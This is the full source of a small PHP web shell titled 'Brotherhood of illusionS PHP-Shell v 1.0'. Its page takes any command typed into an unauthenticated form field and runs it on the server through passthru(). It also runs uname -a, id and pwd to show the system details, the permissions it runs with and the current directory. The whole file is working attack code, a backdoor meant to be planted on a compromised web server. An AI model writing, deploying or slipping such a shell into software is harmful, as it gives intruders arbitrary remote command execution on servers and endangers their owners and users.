<?
//+++++++++++++++++++++++++
// Brotherhood of illusionS
// PHP-Shell v 1.0
// By <(SacrificE)>
//+++++++++++++++++++++++++
?>

<html>
<head>
<title>� Brotherhood of illusions Php-Shell v 1.0 �</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<style type="text/css">
.input {BORDER-RIGHT: #FFFFFF 1px solid; BORDER-TOP: #FFFFFF 1px solid; FONT-SIZE: 12px; background-color:#336699; BORDER-LEFT: #FFFFFF 1px solid; COLOR: #000000; BORDER-BOTTOM: #FFFFFF 1px solid; FONT-FAMILY: Tahoma, Verdana, Arial, sans-serif}
.button {BORDER-RIGHT: #FFFFFF 1px solid; BORDER-TOP: #FFFFFF 1px solid; FONT-SIZE: 12px; background-color:#336699; BORDER-LEFT: #FFFFFF 1px solid; COLOR: #000000; BORDER-BOTTOM: #FFFFFF 1px solid; FONT-FAMILY: Tahoma, Verdana, Arial, sans-serif}
</style>
</head>
<body bgcolor="#000000" text="#FFFF00">
<br><br><br>
<table width="700" border="0" cellpadding="0" cellspacing="0" align="center">
<tr><td align=center><font face="Tahoma" color="#808080"><b>Brotherhood of illusionS PHP-Shell v 1.0</b><br><br></font></td></tr></table>
<table width="700" border="0" cellpadding="0" cellspacing="1" bgcolor="#FFFFFF" align="center">
 <tr>
   <td>
    <table width="100%" border="0" bgcolor="#000000"  >

    <tr>
    </tr>
          <tr>
       <td>
<pre>
<?PHP //MAin part
if ($_POST['command']){
$command = $_POST['command'];
echo "<font color=#336699>";
echo "$command executed!<p>";
echo "<br></font>";
passthru("$command");
}
else {
echo "<font color=#336699>";
echo "No command executed...";
echo "<br></font>";
}
?>
</pre>
 <form name="command" method="post" enctype="multipart/form-data">
              <table width="100%" border="0">
                <tr>
                                 <td align="center"><b><font size="2"><font color="#336699" face="Arial">Command:</font></font></b></td>
                                  <td>

                     <input type="text" name="command" size="65" class="input">
                     <input type="submit" name="submit" value="execute" class="button">
                                         <input type="reset" name="clear" value="clear" class="button">

               </td>
                        </tr>
                </table>
      </form>
          <table width="100%" align="center" cellpadding="0" cellspacing="0" border="0">
            <td align="center"><font size="4" color="#990033">Quick info:</font></td>
          </table>
        <font size="2"><b><font color="#666666">
        System: <font color="#FFFFFF"><? passthru("uname -a"); ?></font><br>
   Permissions: <font color="#FFFFFF"><? passthru("id"); ?></font><br>
   Current dir: <font color="#FFFFFF"><? passthru("pwd"); ?></font></font>
   </b></font>      </td>
        </tr>
      </table>

    </td>
  </tr>
</table>
</body>
</html>